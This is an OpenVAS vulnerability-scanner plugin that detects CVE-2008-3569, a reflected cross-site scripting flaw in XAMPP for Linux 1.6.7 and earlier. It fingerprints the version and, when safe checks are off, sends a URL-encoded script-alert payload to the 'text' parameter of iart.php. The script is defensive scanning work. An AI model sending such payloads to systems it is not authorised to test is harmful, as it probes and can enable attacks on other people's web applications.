##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_xampp_mult_xss_vuln_900023.nasl 9425 2018-04-10 12:38:38Z cfischer $
# Description: XAMPP for Linux text Parameter Multiple XSS Vulnerabilities
#
# Authors:
# Chandan S <schandan@secpod.com>
#
# Copyright:
# Copyright (C) 2008 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
##############################################################################

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.900023");
 script_version("$Revision: 9425 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-10 14:38:38 +0200 (Tue, 10 Apr 2018) $");
 script_tag(name:"creation_date", value:"2008-08-07 17:25:49 +0200 (Thu, 07 Aug 2008)");
 script_cve_id("CVE-2008-3569");
 script_bugtraq_id(30535);
 script_copyright("Copyright (C) 2008 SecPod");
 script_tag(name:"cvss_base", value:"4.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_name("XAMPP for Linux text Parameter Multiple XSS Vulnerabilities");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 script_tag(name : "summary" , value : "The host is running Xampp, which is prone to multiple cross site
 scripting vulnerabilities.");
 script_tag(name : "solution" , value : "Upgrade to Xampp Linux version 1.7.3 or later,
 For updates check, http://www.apachefriends.org/en/xampp-linux.html");
 script_tag(name : "insight" , value : "The flaw is due the input passed to the parameter text in iart.php and
 ming.php files are not santised before being returned to the user.");
 script_tag(name : "impact" , value : "Successful exploitation could allow remote attackers to execute
 arbitrary HTML and script code.

 Impact Level : Application");
 script_tag(name : "affected" , value : "Xampp Linux 1.6.7 and prior on Linux (All).");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/495096");

 script_tag(name:"solution_type", value:"VendorFix");
 script_tag(name:"qod_type", value:"remote_app");
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

## Check the php support
if(!can_host_php(port:port)){
  exit(0);
}

foreach path (make_list_unique("/xampp", cgi_dirs(port:port)))
{

        if(path == "/") path = "";

        rcvRes = http_get_cache(item: path + "/start.php", port:port);
        if(rcvRes == NULL){
                exit(0);
        }

	if(egrep(pattern:"XAMPP for Linux", string:rcvRes) &&
           egrep(pattern:"^HTTP/.* 200 OK", string:rcvRes))
	{
		if(safe_checks())
		{
			if(egrep(pattern:"XAMPP for Linux 1\.([0-5]\..*|6\.[0-7])" +
					 "($|[^.0-9])", string:rcvRes)){
				security_message(port:port);
			}
			exit(0);
		}

		# XSS request sent to parameter text in iart.php
                sndReq = http_get(item:string(path, "/iart.php?text=%22%3E%" +
			 "3E%3C%3C%3E%3E%22%22%3Cscript%3Ealert(document.alert)" +
			 "%3C/script%3E"), port:port);
                rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:1);
                if(rcvRes == NULL){
                        exit(0);
                }

                if('<script>alert(document.alert)</script>' >< rcvRes){
                        security_message(port:port);
                }
                exit(0);
        }
}

exit(99);